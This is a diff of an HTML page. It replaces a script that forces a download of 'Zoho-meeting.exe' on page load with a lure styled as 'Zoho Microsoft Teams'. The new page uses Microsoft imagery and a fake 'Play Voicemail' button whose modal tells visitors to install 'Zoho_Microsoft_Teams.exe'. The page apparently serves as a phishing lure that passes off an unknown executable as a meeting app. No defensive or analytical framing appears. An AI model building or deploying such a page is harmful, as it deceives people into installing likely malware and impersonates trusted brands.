@@ -1,22 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Force Download</title>
-  <script>
-    window.onload = function() {
-      setTimeout(function() {
-        var link = document.createElement('a');
-        link.href = './Zoho-meeting.exe';
-        link.download = 'Zoho-meeting.exe';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }, 3000);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Zoho Microsoft Teams</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
+      text-align: center;
     }
-  </script>
+    .container {
+      max-width: 480px;
+      margin: 80px auto;
+      padding: 24px;
+      background-color: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .header {
+      font-size: 22px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 16px;
+    }
+    .illustration {
+      margin-bottom: 16px;
+    }
+    .illustration img {
+      width: 180px;
+      border-radius: 50%;
+    }
+    .instructions {
+      font-size: 16px;
+      color: #555;
+      margin: 16px 0 12px 0;
+    }
+    .button {
+      width: 90%;
+      max-width: 320px;
+      padding: 12px;
+      margin: 8px auto;
+      font-size: 16px;
+      font-weight: 500;
+      color: #fff;
+      background-color: #6264a7;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+      display: block;
+      text-decoration: none;
+    }
+    .button.secondary {
+      background-color: transparent;
+      color: #6264a7;
+      border: 2px solid #6264a7;
+      text-decoration: none;
+    }
+    .footer {
+      font-size: 13px;
+      color: #666;
+      margin-top: 24px;
+    }
+    .footer a {
+      color: #6264a7;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+    /* Remove underline from anchor wrapping button */
+    a.button-link {
+      text-decoration: none;
+      display: block;
+    }
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 100;
+      left: 0; top: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.25);
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background: #fff;
+      border-radius: 10px;
+      padding: 2rem 1.5rem;
+      width: 90%;
+      max-width: 360px;
+      text-align: center;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.18);
+    }
+    .modal-content h3 {
+      color: #6264a7;
+      margin-bottom: 0.7rem;
+    }
+    .modal-content p {
+      color: #444;
+      margin-bottom: 1.1rem;
+    }
+    .modal .button {
+      margin: 0.5rem 0 0 0;
+      text-decoration: none;
+    }
+    .close-btn {
+      background: none;
+      color: #6264a7;
+      border: none;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 1rem;
+      text-decoration: underline;
+    }
+    .close-btn:hover {
+      text-decoration: none;
+    }
+  </style>
 </head>
 <body>
-  <p>Your download will start soon...</p>
+  <div class="container">
+    <div class="header">Zoho Microsoft Teams</div>
+    <div class="illustration">
+      <img src="https://statics.teams.cdn.office.net/hashedassets-launcher/v2/welcome_to_teams.ae3b0daa8fc4a83cb4cc3e60c4104fe0.svg" alt="Meeting illustration" />
+    </div>
+    <div class="instructions">First you'll need to download the app.</div>
+    <a href="Zoho_Microsoft_Teams.exe" class="button-link" target="_blank">
+      <button class="button">Get Zoho Teams</button>
+    </a>
+    <div class="instructions">Already have the app?</div>
+    <button class="button secondary" id="playBtn">Play Voicemail</button>
+    <div class="footer">The voicemail link will be copied to your clipboard.</div>
+    <div class="footer">
+      <a href="#">Privacy and cookies</a> | <a href="#">Third-party disclosures</a>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal" id="noAppModal" tabindex="-1" role="dialog" aria-modal="true">
+    <div class="modal-content">
+      <h3>Zoho Teams App Not Installed</h3>
+      <p>To play voicemail messages, please download and install the Zoho Teams app.</p>
+      <a href="Zoho_Microsoft_Teams.exe" target="_blank" class="button-link">
+        <button class="button">Download Zoho Teams App</button>
+      </a>
+      <br>
+      <button class="close-btn" onclick="closeModal()">Cancel</button>
+    </div>
+  </div>
+
+  <script>
+    function showModal() {
+      document.getElementById('noAppModal').style.display = 'flex';
+    }
+    function closeModal() {
+      document.getElementById('noAppModal').style.display = 'none';
+    }
+    document.getElementById('playBtn').addEventListener('click', function(e){
+      e.preventDefault();
+      showModal();
+    });
+    // Optional: allow ESC to close modal
+    document.addEventListener('keydown', function(e) {
+      if(e.key === "Escape") closeModal();
+    });
+  </script>
 </body>
 </html>
